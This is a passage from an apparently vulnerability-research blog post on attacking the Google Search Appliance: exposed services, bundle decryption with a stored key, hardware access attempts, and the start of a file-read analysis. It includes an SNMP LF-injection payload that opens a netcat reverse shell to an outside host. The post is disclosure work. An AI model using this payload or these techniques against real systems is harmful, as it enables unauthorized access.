&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following summarizes the actual accessible TCP attack surface:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Program Location&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;And we found that the strings in file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; can be used to decrypt the content of all install bundles! 
After gaining privileges using CVE-2014-6271 and decrypting the contents of the install bundle, 
our research on vGSA has temporarily concluded.&lt;/p&gt;

&lt;p&gt;But its lacks of memory protection might have some vulnerabilities that can be easily exploited.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;

&lt;p&gt;Upon booting the installed appliance and attempting to change the boot sequence,
we found that a password is required to enter the BIOS. 
Moreover, only some functions are accessible in the management interface of the Dell H700 RAID card:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, attempt to directly read the contents of the hard drive. 
If the hard drive content is not encrypted, there is a chance that the device‚Äôs operating system and software can be obtained directly.
We found that its hard drive uses SAS interface for transmission. 
Before attempting, it is necessary to purchase a SAS HBA card. The LSI 9211-8i is used for connection in this test:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After connecting and attempting to read, it was discovered that this is a Self-Encrypting Drive (SED). 
It requires a password to unlock for access. OSSLab has a more detailed explanation here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (chinese article)&lt;/p&gt;

&lt;p&gt;There are several ways to continue trying when the hard drive cannot be directly accessed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Try to read the password in the BIOS EEPROM and change the boot order.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method requires damage to the motherboard and carries some risk. 
This method is only used when no vulnerabilities can be found at the software level.
More information: &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Use PCILeech to read, write memory to gain system privileges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method requires specific PCI-e devices, which were not prepared at the time. You can refer to this GitHub projectÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Look for software vulnerabilities that can access the service&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method is simpler and more feasible.&lt;/p&gt;

&lt;h4 id=&quot;lf-injection-in-admin-console&quot;&gt;LF injection in Admin Console&lt;/h4&gt;

&lt;p&gt;After logging into the admin console, 
we observed a feature for obtaining system information through SNMP.
Additionally, this feature allows the insertion of custom strings.Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried classic LF injection hereÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inject &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysContact&lt;/code&gt; with a LF and following command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After inserting the configuration value ‚Äúextend‚Äù, 
we can use the command ‚Äúsnmpwalk‚Äù to trigger the SNMP‚Äôs extend functionality and execute a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Command executed successfully, and connected back with a shell.&lt;/p&gt;

&lt;h4 id=&quot;arbitrary-file-reading&quot;&gt;Arbitrary File Reading&lt;/h4&gt;

&lt;p&gt;From GSA 6.x series versions, we found that the 80/443 web services use Apache httpd in the RPM installation package. 
There are several http configurations located in /etc/httpd/conf.d/. 
In the files gsa-http.conf and gsaa-https.conf, certain directories are redirected to specific local services.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
  RewriteRule ^/d‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/(.*) http://localhost:7890/dps/d‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/$1 [P,L]
  RewriteRule ^/s‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/(.*) http://localhost:7890/dps/s‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/$1 [P,L]
  RewriteRule ^/v‚ñà‚ñà‚ñà‚ñà‚ñà/(.*) http://localhost:7890/v‚ñà‚ñà‚ñà‚ñà‚ñà/$1 [P,L]
  RewriteRule ^/$ http://localhost:7800/ [P,L]
  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The communication ports 7886 and 7890 are services run by separate Apache Tomcat servers. 
When proxying two or more web servers, the path determination of Tomcat, ..;/, 
is an interesting test point. You can refer to the article written by our employee for more details:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The point we‚Äôre interested in is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dps&lt;/code&gt;, which doesn‚Äôt seem to be present in the old version of GSA. 
Extracting /WEB-INF/web.xml from dps.war allows us to inspect the web application configuration, and we‚Äôve found that the endpoint of /font will handled by
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And looking into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt; which extends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
